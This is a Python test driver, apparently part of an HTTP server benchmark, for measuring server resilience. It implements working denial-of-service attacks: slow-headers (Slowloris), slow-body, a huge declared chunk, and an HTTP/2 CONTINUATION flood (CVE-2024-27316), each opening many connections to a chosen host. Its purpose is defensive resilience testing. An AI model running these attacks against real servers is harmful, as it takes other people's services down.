#!/usr/bin/env python3
"""HttpArena resilience attack driver — adversarial HTTP clients for the
resilience suite. Stdlib only; run on the host (uncapped) against a target
entry running in a memory/CPU-capped container, so what we measure is the
server, not the client.

    attack.py --attack <name> --host H --port P --duration SECS --conns N [opts]

Each attack tries to exhaust one server resource. It prints a one-line JSON
summary of what the *client* did (connections established, how many the server
reaped, bytes sent) to stdout; the runner (scripts/resilience.sh) pairs that
with the server-side signal (peak RSS, OOM-kill, liveness, recovery).

Attacks
  slow-body          N conns POST a large declared Content-Length and then drip
                     the body one byte per interval, never finishing. Tests the
                     body-read timeout / whether the body is buffered whole.
  slow-headers       N conns send a partial header block and keep appending
                     header lines, never sending the terminating CRLF CRLF.
                     Classic Slowloris: header-read timeout / max-conn / header
                     size cap.
  huge-chunk         N conns declare Transfer-Encoding: chunked then announce a
                     chunk of 0x7fffffffffffffff bytes. Tests whether the server
                     pre-allocates the declared chunk buffer (single-request OOM).
  continuation-flood H2(c) conns send HEADERS without END_HEADERS followed by an
                     endless stream of CONTINUATION frames. The server buffers a
                     header block that never ends (CVE-2024-27316). Tests the
                     header-block size cap.

A "reaped" connection is one the server closed on us — which for these attacks
is the *correct* defense (a timeout fired, a cap was enforced). High reaped +
flat server memory = the server defended itself; growing memory / OOM = it did
not.
"""
import argparse
import json
import socket
import ssl
import sys
import threading
import time

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


# ── Connection helpers ───────────────────────────────────────────────────────

def _open(host, port, tls, alpn):
    s = socket.create_connection((host, port), timeout=5)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if alpn:
            try:
                ctx.set_alpn_protocols(alpn)
            except NotImplementedError:
                pass
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


# ── Slow engine (slow-body, slow-headers, huge-chunk) ────────────────────────
#
# Open N connections, send a per-attack opener on each, then every interval push
# a tiny "drip" on each still-open connection until the duration runs out. The
# sends are non-blocking: a server that reaps a connection surfaces as an OSError
# we count, not a stall on our side.

def _run_slow(args, opener, dripper, alpn=None):
    deadline = time.monotonic() + args.duration
    conns = []            # [sock, idx, drips]
    established = connect_errors = 0

    for i in range(args.conns):
        if time.monotonic() > deadline:
            break
        try:
            s = _open(args.host, args.port, args.tls, alpn)
            s.sendall(opener(i))
            s.setblocking(False)
            conns.append([s, i, 0])
            established += 1
        except OSError:
            connect_errors += 1

    reaped = sent = 0
    while time.monotonic() < deadline and conns:
        for c in list(conns):
            s, idx, drips = c
            try:
                payload = dripper(idx, drips)
                n = s.send(payload)
                sent += n
                c[2] += 1
            except (BlockingIOError, ssl.SSLWantWriteError, ssl.SSLWantReadError):
                pass
            except OSError:
                reaped += 1
                conns.remove(c)
                try:
                    s.close()
                except OSError:
                    pass
        time.sleep(args.drip_interval)

    open_at_end = len(conns)
    for c in conns:
        try:
            c[0].close()
        except OSError:
            pass
    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
                drip_sent_bytes=sent, connect_errors=connect_errors)


def slow_body(args):
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Content-Length: {args.body_size}\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A")


def slow_headers(args):
    # GET with no terminating CRLF CRLF; each drip appends another header line,
    # so the request is never complete and the header block keeps growing.
    opener = lambda i: f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
    dripper = lambda i, d: f"X-Pad-{i}-{d}: {'A' * 48}\r\n".encode()
    return _run_slow(args, opener, dripper)


def huge_chunk(args):
    # Declare a chunk of 0x7fffffffffffffff bytes, then drip a little chunk data
    # so a server that waits for the body keeps the (pre-allocated?) buffer.
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"7fffffffffffffff\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A")


# ── HTTP/2 CONTINUATION flood ────────────────────────────────────────────────

def _frame(ftype, flags, stream, payload):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + (stream & 0x7FFFFFFF).to_bytes(4, "big") + payload)


def _hpack_filler(size):
    """A header block of literal-without-indexing fields with new names (HPACK
    0x00 prefix, Huffman off), each ~40 bytes, padded to `size`."""
    out = bytearray()
    k = 0
    while len(out) < size:
        name = f"x-{k:x}".encode()
        val = b"a" * 32
        out += b"\x00" + bytes([len(name)]) + name + bytes([len(val)]) + val
        k += 1
    return bytes(out)


def continuation_flood(args):
    deadline = time.monotonic() + args.duration
    lock = threading.Lock()
    stats = dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)
    auth = args.host.encode()
    # :method GET (0x82), :scheme http (0x86), :path / (0x84), then :authority
    # as a literal with incremental indexing (name index 1).
    initial_block = bytes([0x82, 0x86, 0x84, 0x41, len(auth)]) + auth
    filler = _hpack_filler(16384)

    def worker():
        local = dict(frames=0, nbytes=0)
        try:
            s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
            s.sendall(H2_PREFACE)
            s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
            # HEADERS: END_STREAM (0x1), but NOT END_HEADERS — the block is open.
            s.sendall(_frame(0x1, 0x1, 1, initial_block))
            with lock:
                stats["established"] += 1
            while time.monotonic() < deadline:
                s.sendall(_frame(0x9, 0x0, 1, filler))      # CONTINUATION, no END_HEADERS
                local["frames"] += 1
                local["nbytes"] += len(filler) + 9
        except OSError:
            with lock:
                stats["reaped"] += 1
        finally:
            with lock:
                stats["frames_sent"] += local["frames"]
                stats["bytes_sent"] += local["nbytes"]
            try:
                s.close()
            except (OSError, UnboundLocalError, NameError):
                pass

    threads = []
    for _ in range(args.conns):
        if time.monotonic() > deadline:
            break
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=max(0.0, deadline - time.monotonic()) + 5)
    return stats


ATTACKS = {
    "slow-body": slow_body,
    "slow-headers": slow_headers,
    "huge-chunk": huge_chunk,
    "continuation-flood": continuation_flood,
}


def main():
    p = argparse.ArgumentParser(description="HttpArena resilience attack driver")
    p.add_argument("--attack", required=True, choices=sorted(ATTACKS))
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--path", default="/")
    p.add_argument("--conns", type=int, default=1000)
    p.add_argument("--duration", type=float, default=45.0)
    p.add_argument("--drip-interval", type=float, default=1.0, dest="drip_interval")
    p.add_argument("--body-size", type=int, default=10 * 1024 * 1024, dest="body_size")
    p.add_argument("--tls", action="store_true")
    args = p.parse_args()

    started = time.monotonic()
    result = ATTACKS[args.attack](args)
    result["attack"] = args.attack
    result["conns_requested"] = args.conns
    result["elapsed_s"] = round(time.monotonic() - started, 2)
    json.dump(result, sys.stdout)
    sys.stdout.write("\n")


if __name__ == "__main__":
    main()
